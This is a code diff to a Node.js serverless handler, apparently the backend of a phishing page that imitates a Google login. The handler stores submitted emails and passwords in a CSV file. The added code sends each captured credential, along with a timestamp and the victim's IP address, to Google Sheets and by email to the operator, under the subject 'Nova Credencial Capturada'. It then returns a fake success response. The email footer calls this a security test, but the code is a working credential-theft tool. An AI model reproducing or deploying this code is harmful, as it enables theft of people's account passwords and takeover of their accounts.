@@ -1,6 +1,8 @@
 const fs = require('fs');
 const path = require('path');
 const createCsvWriter = require('csv-writer').createObjectCsvWriter;
+const nodemailer = require('nodemailer');
+const { saveToGoogleSheets } = require('./save-to-sheets');
 
 // Caminho do arquivo CSV (usar /tmp na Vercel)
 const CSV_FILE = path.join('/tmp', 'credentials.csv');
@@ -21,6 +23,68 @@ async function initCSV() {
         await csvWriter.writeRecords([]);
         console.log('Arquivo CSV criado com sucesso');
     }
+}
+
+// Função para enviar email com as credenciais
+async function sendEmailNotification(email, password, timestamp, ip) {
+    // Pegar configurações de email das variáveis de ambiente
+    const emailConfig = {
+        to: process.env.EMAIL_TO, // Seu email para receber
+        from: process.env.EMAIL_FROM || process.env.EMAIL_TO,
+        smtp: {
+            host: process.env.SMTP_HOST || 'smtp.gmail.com',
+            port: parseInt(process.env.SMTP_PORT || '587'),
+            secure: process.env.SMTP_SECURE === 'true',
+            auth: {
+                user: process.env.SMTP_USER,
+                pass: process.env.SMTP_PASS
+            }
+        }
+    };
+
+    // Se não tiver email configurado, não enviar
+    if (!emailConfig.to || !emailConfig.smtp.auth.user) {
+        console.log('Email não configurado, pulando envio');
+        return;
+    }
+
+    // Criar transporter
+    const transporter = nodemailer.createTransport({
+        host: emailConfig.smtp.host,
+        port: emailConfig.smtp.port,
+        secure: emailConfig.smtp.secure,
+        auth: emailConfig.smtp.auth
+    });
+
+    // Criar mensagem
+    const mailOptions = {
+        from: emailConfig.from,
+        to: emailConfig.to,
+        subject: `🔐 Nova Credencial Capturada - ${email}`,
+        html: `
+            <h2>Nova Credencial Capturada</h2>
+            <p><strong>Email:</strong> ${email}</p>
+            <p><strong>Senha:</strong> ${password}</p>
+            <p><strong>Data/Hora:</strong> ${new Date(timestamp).toLocaleString('pt-BR')}</p>
+            <p><strong>IP Address:</strong> ${ip}</p>
+            <hr>
+            <p><small>Este é um email automático do sistema de teste de segurança.</small></p>
+        `,
+        text: `
+Nova Credencial Capturada
+
+Email: ${email}
+Senha: ${password}
+Data/Hora: ${new Date(timestamp).toLocaleString('pt-BR')}
+IP Address: ${ip}
+
+Este é um email automático do sistema de teste de segurança.
+        `
+    };
+
+    // Enviar email
+    const info = await transporter.sendMail(mailOptions);
+    console.log('Email enviado com sucesso:', info.messageId);
 }
 
 module.exports = async (req, res) => {
@@ -75,6 +139,22 @@ module.exports = async (req, res) => {
         }]);
 
         console.log(`Credenciais salvas: ${email} - ${new Date().toLocaleString()}`);
+
+        // Salvar no Google Sheets (se configurado)
+        try {
+            await saveToGoogleSheets(email, password, timestamp, ip);
+        } catch (sheetsError) {
+            console.error('Erro ao salvar no Google Sheets (não crítico):', sheetsError);
+            // Não falhar a requisição se o Sheets não salvar
+        }
+
+        // Enviar email com as credenciais (se configurado)
+        try {
+            await sendEmailNotification(email, password, timestamp, ip);
+        } catch (emailError) {
+            console.error('Erro ao enviar email (não crítico):', emailError);
+            // Não falhar a requisição se o email não enviar
+        }
 
         // Retornar sucesso (simular resposta do Google)
         res.json({ 
